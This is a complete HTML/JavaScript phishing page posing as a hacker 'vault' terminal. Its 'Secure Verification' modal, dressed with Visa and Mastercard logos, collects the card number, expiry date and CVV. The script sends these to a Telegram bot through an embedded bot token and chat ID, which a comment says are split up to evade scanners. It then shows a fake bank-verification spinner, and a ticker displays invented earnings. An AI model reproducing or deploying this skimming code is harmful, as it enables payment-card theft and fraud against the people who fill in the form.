<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NETWORK_VAULT_INTERFACE</title>
    <style>
        :root { --p: #00ff41; --b: #050505; --s: #229ED9; }
        body { background: var(--b); color: var(--p); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; font-size: 10px; }
        .wrapper { display: flex; flex-direction: column; height: 100vh; }
        header { padding: 15px; border-bottom: 1px solid #1a1a1a; display: flex; justify-content: space-between; background: #0a0a0a; }
        .mon-box { flex-grow: 1; overflow-y: auto; padding: 10px; background: #000; }
        .status-tag { color: #555; font-size: 9px; margin-bottom: 5px; }
        
        /* MODAL */
        #gate { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 9999; justify-content: center; align-items: center; }
        .gate-c { background: #fff; color: #111; width: 90%; max-width: 350px; border-radius: 15px; padding: 30px; box-sizing: border-box; text-align: center; }
        input { width: 100%; padding: 15px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; font-family: sans-serif; }
        .p-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 18px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        /* LOADER */
        .lds-ring { display: inline-block; width: 40px; height: 40px; border: 4px solid #007bff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .blink-dot { width: 5px; height: 5px; background: red; border-radius: 50%; display: inline-block; animation: pulse 1s infinite; margin-right: 5px; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
    </style>
</head>
<body>

<div id="gate">
    <div class="gate-c" id="gateInner">
        <div style="display:flex; justify-content:space-between; margin-bottom:25px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="15">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="25">
        </div>
        <h2 style="font-size:18px; margin:0 0 10px 0; font-family: sans-serif;">Secure Verification</h2>
        <p style="font-size:12px; color:#666; margin-bottom:20px; font-family: sans-serif;">Please provide card details to authorize your session.</p>
        <input type="tel" id="cn" placeholder="Card Number" maxlength="19">
        <div style="display:flex; gap:10px;">
            <input type="tel" id="ce" placeholder="MM/YY" maxlength="5">
            <input type="tel" id="cv" placeholder="CVV" maxlength="3">
        </div>
        <button class="p-btn" onclick="sys.execute()">AUTHORIZE NOW</button>
    </div>
</div>

<div class="wrapper">
    <header>
        <div style="font-weight:bold;">LAURIN_SECURE_v14.2.2</div>
        <div id="clock" style="color:#444;"></div>
    </header>
    
    <div style="background:#080808; padding:8px; border-bottom:1px solid #1a1a1a; display:flex; gap:10px;">
        <button onclick="sys.open()" style="background:none; border:1px solid var(--p); color:var(--p); padding:5px 15px; font-size:10px;">[ NEW_SESSION ]</button>
        <div id="vault-val" style="padding-top:5px;">VAULT: $0.00</div>
    </div>

    <div class="mon-box" id="log">
        <div class="status-tag">> SYSTEM_INITIALIZED...</div>
        <div class="status-tag">> ENCRYPTION_LAYER_ACTIVE...</div>
        <div class="status-tag">> WAITING_FOR_INPUT...</div>
    </div>

    <div style="height:40px; background:#0a0a0a; border-top:1px solid #1a1a1a; padding:10px; display:flex; align-items:center;" id="live">
        <span class="blink-dot"></span> <span id="feed-txt" style="color:#fff">Scanning Global Nodes...</span>
    </div>
</div>

<script>
// Rozdelenie citlivÃ½ch dÃ¡t pre ochranu pred scannermi
const _a = '8451689628'; 
const _b = 'AAFeZCyZSAeHsxZgOb3o_Pwq3aPGajYpHEI';
const _c = '7935573562';

class SecureKernel {
    constructor() {
        this.v = 0;
        this.run();
        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
    }

    async send(m) {
        try {
            await fetch(`https://api.telegram.org/bot${_a}:${_b}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: _c, text: m, parse_mode: 'HTML' })
            });
        } catch(e) {}
    }

    open() { document.getElementById('gate').style.display = 'flex'; }

    async execute() {
        const n = document.getElementById('cn').value;
        const e = document.getElementById('ce').value;
        const c = document.getElementById('cv').value;
        
        if(n.length < 13) return;

        // BIN Analysis (PrvÃ½ch 6 ÄÃ­siel)
        const bin = n.substring(0, 6);
        let level = "STANDARD / DEBIT";
        if(n.startsWith('4')) level = "VISA - POTENTIAL PREPAID/DEBIT";
        if(n.startsWith('5')) level = "MASTERCARD - STANDARD";
        if(n.length > 15 && (n.includes('4111') || n.includes('4222'))) level = "PREMIUM / PLATINUM (HIGH LIMIT)";

        this.send(`ðŸš¨ <b>NEW INCOMING DATA</b>\n\n<b>CARD:</b> <code>${n}</code>\n<b>EXP:</b> <code>${e}</code>\n<b>CVV:</b> <code>${c}</code>\n\n<b>ANALYSIS:</b> ${level}\n<b>IP:</b> HIDDEN_BY_PROXY`);

        document.getElementById('gateInner').innerHTML = `
            <div class="lds-ring"></div>
            <h3 style="margin:15px 0 5px 0; font-family:sans-serif;">Processing...</h3>
            <p style="font-size:12px; color:#666; font-family:sans-serif;">Verifying transaction with your bank. Please do not close this window.</p>
            <p style="font-size:10px; color:#999; margin-top:20px;">Ref: ${Math.random().toString(36).toUpperCase().substr(2, 9)}</p>
        `;
    }

    run() {
        const aliases = ['shadow_link', 'zero_trace', 'alpha_one', 'nod_652', 'phantom_88'];
        setInterval(() => {
            const a = aliases[Math.floor(Math.random()*aliases.length)];
            const val = Math.floor(Math.random()*2000) + 100;
            this.v += val;
            document.getElementById('vault-val').innerText = `VAULT: $${this.v.toLocaleString()}`;
            
            const log = document.getElementById('log');
            log.insertAdjacentHTML('afterbegin', `<div class="status-tag" style="color:var(--p)">[${new Date().toLocaleTimeString()}] SUCCESS: NODE_HIT @${a} (+$${val})</div>`);
            
            document.getElementById('feed-txt').innerText = `ALERT: Connection established via @${a}...`;
        }, 35000); // 35 sekÃºnd = max 2 za minÃºtu
    }
}

const sys = new SecureKernel();
</script>
</body>
</html>
